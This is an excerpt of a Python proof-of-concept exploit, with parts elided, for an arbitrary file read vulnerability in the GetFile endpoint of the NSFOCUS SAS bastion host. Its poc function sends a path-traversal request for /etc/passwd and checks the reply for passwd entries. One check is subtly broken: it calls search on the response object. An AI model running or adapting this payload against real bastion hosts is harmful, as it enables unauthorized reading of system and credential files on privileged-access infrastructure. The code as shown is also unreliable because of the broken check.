...
def main():
    banner()
    parser = argparse.ArgumentParser(description="绿盟SAS堡垒机GetFile任意文件读取漏洞")
...
def poc(target):
    payload_url = "/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd"
    ...
    try:
        ...
        if res.status_code == 200 and res.search('nos:[x*]?:[0-9]:[0-9]:', res.text).group() in res.text:
